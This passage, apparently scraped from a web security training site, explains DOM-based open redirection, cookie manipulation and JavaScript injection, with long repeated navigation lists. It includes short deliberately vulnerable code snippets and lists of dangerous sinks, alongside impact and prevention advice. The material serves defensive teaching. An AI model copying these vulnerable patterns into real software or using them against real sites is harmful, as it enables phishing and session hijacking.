[Preventing](https://portswigger.net/web-security/dom-based/web-message-manipulation#how-to-prevent-dom-based-web-message-manipulation)\n*    [Ajax request-header manipulation](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#what-is-the-impact-of-dom-based-ajax-request-header-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#which-sinks-can-lead-to-dom-based-ajax-request-header-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#how-to-prevent-dom-based-ajax-request-header-manipulation)\n*    [Local file-path manipulation](https://portswigger.net/web-security/dom-based/local-file-path-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#what-is-the-impact-of-dom-based-local-file-path-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#which-sinks-can-lead-to-dom-based-local-file-path-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#how-to-prevent-dom-based-local-file-path-manipulation-vulnerabilities)\n*    [Client-side SQL injection](https://portswigger.net/web-security/dom-based/client-side-sql-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-sql-injection#what-is-the-impact-of-dom-based-client-side-sql-injection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-sql-injection#which-sinks-can-lead-to-dom-based-client-side-sql-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-sql-injection#how-to-prevent-dom-based-client-side-sql-injection-vulnerabilities)\n*    [HTML5-storage manipulation](https://portswigger.net/web-security/dom-based/html5-storage-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/html5-storage-manipulation#which-sinks-can-lead-to-dom-based-html5-storage-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/html5-storage-manipulation#how-to-prevent-dom-based-html5-storage-manipulation-vulnerabilities)\n*    [Client-side XPath injection](https://portswigger.net/web-security/dom-based/client-side-xpath-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#what-is-the-impact-of-dom-based-xpath-injection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#which-sinks-can-lead-to-xpath-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#how-to-prevent-dom-based-xpath-injection-vulnerabilities)\n*    [Client-side JSON injection](https://portswigger.net/web-security/dom-based/client-side-json-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-json-injection#what-is-the-impact-of-a-dom-based-json-injection-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-json-injection#which-sinks-can-lead-to-dom-based-json-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-json-injection#how-to-prevent-client-side-json-injection-vulnerabilities)\n*    [DOM-data manipulation](https://portswigger.net/web-security/dom-based/dom-data-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/dom-data-manipulation#what-is-the-impact-of-dom-data-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/dom-data-manipulation#which-sinks-can-lead-to-dom-data-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/dom-data-manipulation#how-to-prevent-dom-data-manipulation-vulnerabilities)\n*    [Denial of service](https://portswigger.net/web-security/dom-based/denial-of-service)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/denial-of-service#which-sinks-can-lead-to-dom-based-denial-of-service-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/denial-of-service#how-to-prevent-dom-based-denial-of-service-vulnerabilities)\n*    [Web message vulnerabilities](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)\n    *   [Impact](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#what-is-the-impact-of-dom-based-web-message-vulnerabilities)\n    *   [Constructing an attack](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#how-to-construct-an-attack-using-web-messages-as-the-source)\n    *   [Origin verification](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#origin-verification)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#which-sinks-can-lead-to-dom-based-web-message-vulnerabilities)\n*    [DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)\n    *   [Exploiting](https://portswigger.net/web-security/dom-based/dom-clobbering#how-to-exploit-dom-clobbering-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/dom-clobbering#how-to-prevent-dom-clobbering-attacks)\n*   [Preventing vulnerabilities](https://portswigger.net/web-security/dom-based#how-to-prevent-dom-based-taint-flow-vulnerabilities)\n*   [View all DOM-based vulnerability labs](https://portswigger.net/web-security/all-labs#dom-based-vulnerabilities)\n\n*   [Web Security Academy](https://portswigger.net/web-security)\n*   [DOM-based](https://portswigger.net/web-security/dom-based)\n*   [Open redirection](https://portswigger.net/web-security/dom-based/open-redirection)\n\nDOM-based open redirection\n==========================\n\nIn this section, we'll talk about what DOM-based open redirection is, demonstrate how an attack is constructed, and suggest ways to reduce your exposure to DOM-based open-redirection vulnerabilities.\n\nWhat is DOM-based open redirection?\n-----------------------------------\n\nDOM-based open-redirection vulnerabilities arise when a script writes attacker-controllable data into a sink that can trigger cross-domain navigation. For example, the following code is vulnerable due to the unsafe way it handles the `location.hash` property:\n\n```\nlet url = /https?:\\/\\/.+/.exec(location.hash);\nif (url) {\n\u00a0\u00a0location = url[0];\n}\n```An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will cause a redirection to an arbitrary external domain.\n\nWhat is the impact of DOM-based open redirection?\n-------------------------------------------------\n\nThis behavior can be leveraged to facilitate phishing attacks against users of the website, for example. The ability to use an authentic application URL targeting the correct domain and with a valid TLS certificate (if TLS is used) lends credibility to the phishing attack because many users, even if they verify these features, will not notice the subsequent redirection to a different domain.\n\nIf an attacker is able to control the start of the string that is passed to the redirection API, then it may be possible to escalate this vulnerability into a JavaScript injection attack. An attacker could construct a URL with the `javascript:` pseudo-protocol to execute arbitrary code when the URL is processed by the browser.\n\nLAB\n\nPRACTITIONER [DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection)\n\nWhich sinks can lead to DOM-based open-redirection vulnerabilities?\n-------------------------------------------------------------------\n\nThe following are some of the main sinks can lead to DOM-based open-redirection vulnerabilities:\n\n```\nlocation\nlocation.host\nlocation.hostname\nlocation.href\nlocation.pathname\nlocation.search\nlocation.protocol\nlocation.assign()\nlocation.replace()\nopen()\nelement.srcdoc\nXMLHttpRequest.open()\nXMLHttpRequest.send()\njQuery.ajax()\n$.ajax()\n```\n\nHow to prevent DOM-based open-redirection vulnerabilities\n---------------------------------------------------------\n\nIn addition to the general measures described in the [DOM-vulnerabilities](https://portswigger.net/web-security/dom-based) topic, you should avoid dynamically setting redirection targets using data that originated from any untrusted source.\n\n#### Read more\n\n*   [URL validation bypass cheat sheet](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet)\n\n", "category": "DOM Based Vulnerabilities"}, {"title": "Cookie manipulation", "content": "### DOM-based vulnerabilities\n\n*   [What is the DOM?](https://portswigger.net/web-security/dom-based#what-is-the-dom)\n*    [Taint flow](https://portswigger.net/web-security/dom-based#what-is-taint-flow)\n    *    [Sources](https://portswigger.net/web-security/dom-based#common-sources)\n        *   [Reflected and stored data](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data)\n        *   [Web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)\n    *   [Example sinks](https://portswigger.net/web-security/dom-based#which-sinks-can-lead-to-dom-based-vulnerabilities)\n*   [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)\n*    [Open redirection](https://portswigger.net/web-security/dom-based/open-redirection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/open-redirection#what-is-the-impact-of-dom-based-open-redirection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/open-redirection#which-sinks-can-lead-to-dom-based-open-redirection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/open-redirection#how-to-prevent-dom-based-open-redirection-vulnerabilities)\n*    [Cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/cookie-manipulation#what-is-the-impact-of-a-dom-based-cookie-manipulation-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/cookie-manipulation#which-sinks-can-lead-to-dom-based-cookie-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/cookie-manipulation#how-to-prevent-dom-based-cookie-manipulation-vulnerabilities)\n*    [JavaScript injection](https://portswigger.net/web-security/dom-based/javascript-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/javascript-injection#what-is-the-impact-of-a-dom-based-javascript-injection-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/javascript-injection#which-sinks-can-lead-to-dom-based-javascript-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/javascript-injection#how-to-prevent-dom-based-javascript-injection-vulnerabilities)\n*    [Document-domain manipulation](https://portswigger.net/web-security/dom-based/document-domain-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/document-domain-manipulation#which-sinks-can-lead-to-dom-based-document-domain-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/document-domain-manipulation#how-to-prevent-dom-based-document-domain-manipulation-vulnerabilities)\n*    [WebSocket-URL poisoning](https://portswigger.net/web-security/dom-based/websocket-url-poisoning)\n    *   [Impact](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#what-is-the-impact-of-websocket-url-poisoning)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#which-sinks-can-lead-to-websocket-url-poisoning-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#how-to-prevent-dom-based-websocket-url-poisoning-vulnerabilities)\n*    [Link manipulation](https://portswigger.net/web-security/dom-based/link-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/link-manipulation#what-is-the-impact-of-a-dom-based-link-manipulation-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/link-manipulation#which-sinks-can-lead-to-dom-based-link-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/link-manipulation#how-to-prevent-dom-based-link-manipulation-vulnerabilities)\n*    [Web message manipulation](https://portswigger.net/web-security/dom-based/web-message-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/web-message-manipulation#which-sinks-can-lead-to-dom-based-web-message-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/web-message-manipulation#how-to-prevent-dom-based-web-message-manipulation)\n*    [Ajax request-header manipulation](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#what-is-the-impact-of-dom-based-ajax-request-header-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#which-sinks-can-lead-to-dom-based-ajax-request-header-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#how-to-prevent-dom-based-ajax-request-header-manipulation)\n*    [Local file-path manipulation](https://portswigger.net/web-security/dom-based/local-file-path-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#what-is-the-impact-of-dom-based-local-file-path-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#which-sinks-can-lead-to-dom-based-local-file-path-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#how-to-prevent-dom-based-local-file-path-manipulation-vulnerabilities)\n*    [Client-side SQL injection](https://portswigger.net/web-security/dom-based/client-side-sql-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-sql-injection#what-is-the-impact-of-dom-based-client-side-sql-injection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-sql-injection#which-sinks-can-lead-to-dom-based-client-side-sql-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-sql-injection#how-to-prevent-dom-based-client-side-sql-injection-vulnerabilities)\n*    [HTML5-storage manipulation](https://portswigger.net/web-security/dom-based/html5-storage-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/html5-storage-manipulation#which-sinks-can-lead-to-dom-based-html5-storage-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/html5-storage-manipulation#how-to-prevent-dom-based-html5-storage-manipulation-vulnerabilities)\n*    [Client-side XPath injection](https://portswigger.net/web-security/dom-based/client-side-xpath-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#what-is-the-impact-of-dom-based-xpath-injection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#which-sinks-can-lead-to-xpath-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#how-to-prevent-dom-based-xpath-injection-vulnerabilities)\n*    [Client-side JSON injection](https://portswigger.net/web-security/dom-based/client-side-json-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-json-injection#what-is-the-impact-of-a-dom-based-json-injection-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-json-injection#which-sinks-can-lead-to-dom-based-json-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-json-injection#how-to-prevent-client-side-json-injection-vulnerabilities)\n*    [DOM-data manipulation](https://portswigger.net/web-security/dom-based/dom-data-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/dom-data-manipulation#what-is-the-impact-of-dom-data-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/dom-data-manipulation#which-sinks-can-lead-to-dom-data-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/dom-data-manipulation#how-to-prevent-dom-data-manipulation-vulnerabilities)\n*    [Denial of service](https://portswigger.net/web-security/dom-based/denial-of-service)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/denial-of-service#which-sinks-can-lead-to-dom-based-denial-of-service-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/denial-of-service#how-to-prevent-dom-based-denial-of-service-vulnerabilities)\n*    [Web message vulnerabilities](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)\n    *   [Impact](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#what-is-the-impact-of-dom-based-web-message-vulnerabilities)\n    *   [Constructing an attack](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#how-to-construct-an-attack-using-web-messages-as-the-source)\n    *   [Origin verification](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#origin-verification)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#which-sinks-can-lead-to-dom-based-web-message-vulnerabilities)\n*    [DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)\n    *   [Exploiting](https://portswigger.net/web-security/dom-based/dom-clobbering#how-to-exploit-dom-clobbering-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/dom-clobbering#how-to-prevent-dom-clobbering-attacks)\n*   [Preventing vulnerabilities](https://portswigger.net/web-security/dom-based#how-to-prevent-dom-based-taint-flow-vulnerabilities)\n*   [View all DOM-based vulnerability labs](https://portswigger.net/web-security/all-labs#dom-based-vulnerabilities)\n\n*   [Web Security Academy](https://portswigger.net/web-security)\n*   [DOM-based](https://portswigger.net/web-security/dom-based)\n*   [Cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation)\n\nDOM-based cookie manipulation\n=============================\n\nIn this section, we'll describe DOM-based cookie manipulation, look at what impact it can have, and suggest ways to reduce your exposure to cookie-manipulation vulnerabilities.\n\nWhat is DOM-based cookie manipulation?\n--------------------------------------\n\nSome DOM-based vulnerabilities allow attackers to manipulate data that they do not typically control. This transforms normally-safe data types, such as cookies, into potential sources. DOM-based cookie-manipulation vulnerabilities arise when a script writes attacker-controllable data into the value of a cookie.\n\nAn attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will set an arbitrary value in the user's cookie. Many sinks are largely harmless on their own, but DOM-based cookie-manipulation attacks demonstrate how low-severity vulnerabilities can sometimes be used as part of an exploit chain for a high-severity attack. For example, if JavaScript writes data from a source into `document.cookie` without sanitizing it first, an attacker can manipulate the value of a single cookie to inject arbitrary values:\n\n`document.cookie = 'cookieName='+location.hash.slice(1);`If the website unsafely reflects values from cookies without HTML-encoding them, an attacker can use cookie-manipulation techniques to exploit this behavior.\n\nLAB\n\nPRACTITIONER [DOM-based cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation)\n\nWhat is the impact of a DOM-based cookie-manipulation attack?\n-------------------------------------------------------------\n\nThe potential impact of this vulnerability depends on the role that the cookie plays within the website. If the cookie is used to control the behavior that results from certain user actions (for example, a production versus demo mode setting), then the attacker may be able to cause the user to perform unintended actions by manipulating the cookie's value.\n\nIf the cookie is used to track the user's session, then the attacker may be able to perform a session fixation attack, in which they set the cookie's value to a valid token that they have obtained from the website, and then hijack the session during the victim's subsequent interaction with the website. A cookie-manipulation vulnerability like this can be used to attack not only the vulnerable website, but any other website under the same parent domain.\n\nWhich sinks can lead to DOM-based cookie-manipulation vulnerabilities?\n----------------------------------------------------------------------\n\nThe `document.cookie` sink can lead to DOM-based cookie-manipulation vulnerabilities.\n\nHow to prevent DOM-based cookie-manipulation vulnerabilities\n------------------------------------------------------------\n\nIn addition to the general measures described on the [DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based) page, you should avoid dynamically writing to cookies using data that originated from any untrusted source.\n\n", "category": "DOM Based Vulnerabilities"}, {"title": "JavaScript injection", "content": "### DOM-based vulnerabilities\n\n*   [What is the DOM?](https://portswigger.net/web-security/dom-based#what-is-the-dom)\n*    [Taint flow](https://portswigger.net/web-security/dom-based#what-is-taint-flow)\n    *    [Sources](https://portswigger.net/web-security/dom-based#common-sources)\n        *   [Reflected and stored data](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data)\n        *   [Web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)\n    *   [Example sinks](https://portswigger.net/web-security/dom-based#which-sinks-can-lead-to-dom-based-vulnerabilities)\n*   [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)\n*    [Open redirection](https://portswigger.net/web-security/dom-based/open-redirection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/open-redirection#what-is-the-impact-of-dom-based-open-redirection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/open-redirection#which-sinks-can-lead-to-dom-based-open-redirection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/open-redirection#how-to-prevent-dom-based-open-redirection-vulnerabilities)\n*    [Cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/cookie-manipulation#what-is-the-impact-of-a-dom-based-cookie-manipulation-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/cookie-manipulation#which-sinks-can-lead-to-dom-based-cookie-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/cookie-manipulation#how-to-prevent-dom-based-cookie-manipulation-vulnerabilities)\n*    [JavaScript injection](https://portswigger.net/web-security/dom-based/javascript-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/javascript-injection#what-is-the-impact-of-a-dom-based-javascript-injection-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/javascript-injection#which-sinks-can-lead-to-dom-based-javascript-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/javascript-injection#how-to-prevent-dom-based-javascript-injection-vulnerabilities)\n*    [Document-domain manipulation](https://portswigger.net/web-security/dom-based/document-domain-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/document-domain-manipulation#which-sinks-can-lead-to-dom-based-document-domain-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/document-domain-manipulation#how-to-prevent-dom-based-document-domain-manipulation-vulnerabilities)\n*    [WebSocket-URL poisoning](https://portswigger.net/web-security/dom-based/websocket-url-poisoning)\n    *   [Impact](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#what-is-the-impact-of-websocket-url-poisoning)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#which-sinks-can-lead-to-websocket-url-poisoning-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#how-to-prevent-dom-based-websocket-url-poisoning-vulnerabilities)\n*    [Link manipulation](https://portswigger.net/web-security/dom-based/link-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/link-manipulation#what-is-the-impact-of-a-dom-based-link-manipulation-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/link-manipulation#which-sinks-can-lead-to-dom-based-link-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/link-manipulation#how-to-prevent-dom-based-link-manipulation-vulnerabilities)\n*    [Web message manipulation](https://portswigger.net/web-security/dom-based/web-message-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/web-message-manipulation#which-sinks-can-lead-to-dom-based-web-message-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/web-message-manipulation#how-to-prevent-dom-based-web-message-manipulation)\n*    [Ajax request-header manipulation](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#what-is-the-impact-of-dom-based-ajax-request-header-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#which-sinks-can-lead-to-dom-based-ajax-request-header-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#how-to-prevent-dom-based-ajax-request-header-manipulation)\n*    [Local file-path manipulation](https://portswigger.net/web-security/dom-based/local-file-path-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#what-is-the-impact-of-dom-based-local-file-path-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#which-sinks-can-lead-to-dom-based-local-file-path-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#how-to-prevent-dom-based-local-file-path-manipulation-vulnerabilities)\n*    [Client-side SQL injection](https://portswigger.net/web-security/dom-based/client-side-sql-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-sql-injection#what-is-the-impact-of-dom-based-client-side-sql-injection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-sql-injection#which-sinks-can-lead-to-dom-based-client-side-sql-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-sql-injection#how-to-prevent-dom-based-client-side-sql-injection-vulnerabilities)\n*    [HTML5-storage manipulation](https://portswigger.net/web-security/dom-based/html5-storage-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/html5-storage-manipulation#which-sinks-can-lead-to-dom-based-html5-storage-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/html5-storage-manipulation#how-to-prevent-dom-based-html5-storage-manipulation-vulnerabilities)\n*    [Client-side XPath injection](https://portswigger.net/web-security/dom-based/client-side-xpath-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#what-is-the-impact-of-dom-based-xpath-injection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#which-sinks-can-lead-to-xpath-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#how-to-prevent-dom-based-xpath-injection-vulnerabilities)\n*    [Client-side JSON injection](https://portswigger.net/web-security/dom-based/client-side-json-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-json-injection#what-is-the-impact-of-a-dom-based-json-injection-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-json-injection#which-sinks-can-lead-to-dom-based-json-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-json-injection#how-to-prevent-client-side-json-injection-vulnerabilities)\n*    [DOM-data manipulation](https://portswigger.net/web-security/dom-based/dom-data-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/dom-data-manipulation#what-is-the-impact-of-dom-data-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/dom-data-manipulation#which-sinks-can-lead-to-dom-data-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/dom-data-manipulation#how-to-prevent-dom-data-manipulation-vulnerabilities)\n*    [Denial of service](https://portswigger.net/web-security/dom-based/denial-of-service)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/denial-of-service#which-sinks-can-lead-to-dom-based-denial-of-service-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/denial-of-service#how-to-prevent-dom-based-denial-of-service-vulnerabilities)\n*    [Web message vulnerabilities](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)\n    *   [Impact](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#what-is-the-impact-of-dom-based-web-message-vulnerabilities)\n    *   [Constructing an attack](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#how-to-construct-an-attack-using-web-messages-as-the-source)\n    *   [Origin verification](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#origin-verification)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#which-sinks-can-lead-to-dom-based-web-message-vulnerabilities)\n*    [DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)\n    *   [Exploiting](https://portswigger.net/web-security/dom-based/dom-clobbering#how-to-exploit-dom-clobbering-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/dom-clobbering#how-to-prevent-dom-clobbering-attacks)\n*   [Preventing vulnerabilities](https://portswigger.net/web-security/dom-based#how-to-prevent-dom-based-taint-flow-vulnerabilities)\n*   [View all DOM-based vulnerability labs](https://portswigger.net/web-security/all-labs#dom-based-vulnerabilities)\n\n*   [Web Security Academy](https://portswigger.net/web-security)\n*   [DOM-based](https://portswigger.net/web-security/dom-based)\n*   [JavaScript injection](https://portswigger.net/web-security/dom-based/javascript-injection)\n\nDOM-based JavaScript injection\n==============================\n\nIn this section, we'll talk about DOM-based JavaScript-injection vulnerabilities, discuss how they can impact the victim, and suggest ways to reduce your exposure to JavaScript-injection vulnerabilities.\n\nWhat is DOM-based JavaScript injection?\n---------------------------------------\n\nDOM-based JavaScript-injection vulnerabilities arise when a script executes attacker-controllable data as JavaScript. An attacker may be able to use the vulnerability to construct a URL that, if visited by another user, will cause arbitrary JavaScript supplied by the attacker to execute in the context of the user's browser session.\n\nUsers can be induced to visit the attacker's malicious URL in various ways, similar to the usual attack-delivery vectors for [reflected cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerabilities. For more information, please refer to our page on [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based).\n\nWhat is the impact of a DOM-based JavaScript-injection attack?\n--------------------------------------------------------------\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, or even logging their keystrokes.\n\nWhich sinks can lead to DOM-based JavaScript-injection vulnerabilities?\n-----------------------------------------------------------------------\n\nThe following are some of the main sinks that can lead to DOM-based JavaScript-injection vulnerabilities:\n\n```\neval()\nFunction()\nsetTimeout()\nsetInterval()\nsetImmediate()\nexecCommand()\nexecScript()\nmsSetImmediate()\nrange.createContextualFragment()\ncrypto.generateCRMFRequest()\n```\n\nHow to prevent DOM-based JavaScript-injection vulnerabilities\n-------------------------------------------------------------\n\nIn addition to the general measures described on the [DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based) page, you should avoid allowing data from any untrusted source to be executed as JavaScript.\n\n", "category": "DOM Based Vulnerabilities"}, {"title": "Document-domain manipulation", "content": "### DOM-based vulnerabilities\n\n*   [What is the DOM?](https://portswigger.net/web-security/dom-based#what-is-the-dom)\n*    [Taint flow](https://portswigger.net/web-security/dom-based#what-is-taint-flow)\n    *    [Sources](https://portswigger.net/web-security/dom-based#common-sources)\n        *   [Reflected and stored data](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data)\n        *   [Web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)\n    *   [Example sinks](https://portswigger.net/web-security/dom-based#which-sinks-can-lead-to-dom-based-vulnerabilities)\n*   [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)\n*    [Open redirection](https://portswigger.net/web-security/dom-based/open-redirection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/open-redirection#what-is-the-impact-of-dom-based-open-redirection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/open-redirection#which-sinks-can-lead-to-dom-based-open-redirection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/open-redirection#how-to-prevent-dom-based-open-redirection-vulnerabilities)\n*    [Cookie 